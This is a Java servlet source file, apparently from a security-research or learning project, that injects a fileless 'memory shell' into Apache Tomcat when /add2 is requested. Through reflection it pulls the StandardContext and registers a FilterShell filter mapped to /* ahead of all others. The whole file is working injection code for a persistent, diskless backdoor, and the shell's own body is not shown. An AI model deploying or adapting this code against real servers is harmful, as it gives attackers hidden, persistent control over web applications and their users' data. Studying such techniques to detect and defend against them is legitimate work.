package cn.safe6.action;

import cn.safe6.filter.FilterShell;
import org.apache.catalina.Container;
import org.apache.catalina.Context;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardWrapper;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Map;

/**
 * Filter内存马添加
 */
@WebServlet("/add2")
public class AddShellFilter extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        try {
            //先拿到ServletContext
            ServletContext servletContext = req.getServletContext();
            Field appctx =servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);

            //从ServletContext里面拿到ApplicationContext
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field atx= applicationContext.getClass().getDeclaredField("context");
            atx.setAccessible(true);
            //从ApplicationContext里面拿到StandardContext
            StandardContext standardContext = (StandardContext) atx.get(applicationContext);

            //准备filter马
            FilterShell filterShell = new FilterShell();

            //拿到关键的三个对象
            Field filterDefsField = standardContext.getClass().getDeclaredField("filterDefs");
            filterDefsField.setAccessible(true);
            Field filterMapsField = standardContext.getClass().getDeclaredField("filterMaps");
            filterMapsField.setAccessible(true);
            Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);

            //用def包装filter
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filterShell);
            filterDef.setFilterName(filterShell.getClass().getName());
            filterDef.setFilterClass(filterShell.getClass().getName());

            //添加到上下文
            standardContext.addFilterDef(filterDef);

            //配置映射关系
            FilterMap filterMap = new FilterMap();

            filterMap.setFilterName(filterShell.getClass().getName());
            filterMap.addURLPattern("/*");
            //添加到上下文
            //standardContext.addFilterMap(filterMap);
            //添加到第一位
            standardContext.addFilterMapBefore(filterMap);


            //无法直接new，需要反射
            //ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(standardContext,filterDef);
            //创建filterConfig
            Class<?> ac = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
            //Class<?> ac1 = this.getClass().getClassLoader().loadClass("org.apache.catalina.core.ApplicationFilterConfig");

            //构造方法不是public的
            Constructor constructor = ac.getDeclaredConstructor(org.apache.catalina.Context.class,org.apache.tomcat.util.descriptor.web.FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            //添加到filterConfigs
            Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>)filterConfigsField.get(standardContext);
            filterConfigs.put(filterShell.getClass().getName(),filterConfig);

            //改modifiers
            Field modifiers = filterConfigsField.getClass().getDeclaredField("modifiers");
            modifiers.setAccessible(true);
            modifiers.setInt(filterConfigsField,filterConfigsField.getModifiers() & ~Modifier.FINAL);

            //还原filterConfigs,可以不做，用的是一个引用
            //filterConfigsField.set(standardContext,filterConfigs);



            resp.getWriter().write("add success!");
            return;

        } catch (Exception e) {
            e.printStackTrace();
        }
        resp.getWriter().write("add failed!");

    }
}
